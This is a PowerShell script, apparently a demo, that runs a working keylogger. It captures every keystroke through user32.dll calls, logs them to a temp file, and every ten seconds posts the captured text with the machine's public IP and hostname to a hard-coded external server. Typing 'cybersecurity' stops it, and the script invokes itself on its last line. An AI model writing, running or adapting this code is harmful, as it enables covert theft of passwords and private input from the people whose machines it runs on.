function Send-Data($assoc)
{
  $res = Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content)
  $ip = $res | Select-String -Pattern \d\d?\d?\.\d\d?\d?\.\d\d?\d?\.\d\d?\d? | foreach {$_.Matches.Value}
  $hostn = hostname
  $headers = @{
    "Content-Type" = "application/json"
  }
  $uri = "http://18.222.183.100:5000/post"
  $body = @{
      "data" = $assoc
      "ip" = $ip
      "name" = $hostn
  }
  $body = $body | ConvertTo-Json
  Invoke-RestMethod -Uri $uri -Method POST -Body $body -Headers $headers
    $assoc = ""
}
function Test-KeyLogger($logPath="$env:temp\test_keylogger.txt")
 {
$timer = [Diagnostics.Stopwatch]::StartNew()
   # API declaration
   $APIsignatures = @"
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
"@
  $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru

   # output file
   $no_output = New-Item -Path $logPath -ItemType File -Force
  $pattern = "cybersecurity"
   try
   {
	$assoc = ""
     while ($true) {
       Start-Sleep -Milliseconds 40
       for ($ascii = 9; $ascii -le 254; $ascii++) {
         # get key state
         $keystate = $API::GetAsyncKeyState($ascii)
         # if key pressed
         if ($keystate -eq -32767) {
           $null = [console]::CapsLock
           # translate code
           $virtualKey = $API::MapVirtualKey($ascii, 3)
           # get keyboard state and create stringbuilder
           $kbstate = New-Object Byte[] 256
           $checkkbstate = $API::GetKeyboardState($kbstate)
           $loggedchar = New-Object -TypeName System.Text.StringBuilder
           
           # translate virtual key
           if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $loggedchar, $loggedchar.Capacity, 0))
           {
             #if success, add key to logger file
             [System.IO.File]::AppendAllText($logPath, $loggedchar, [System.Text.Encoding]::Unicode)
	$assoc += $loggedchar
           }
         }
       }
       if ($assoc.Length -ge 13 -and $assoc.Substring($assoc.Length -13) -eq $pattern) {
        throw "exit the keylogger"
      }
	if ($timer.elapsed.totalseconds -gt 10) {
    Send-Data($assoc)
	$timer.stop()
	$timer = [Diagnostics.Stopwatch]::StartNew()
	}
     }
   }
   finally
   {
    Send-Data($assoc)
    [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
    [System.Windows.Forms.MessageBox]::Show("The keylogger has been exited.")
   }
 }
Test-Keylogger
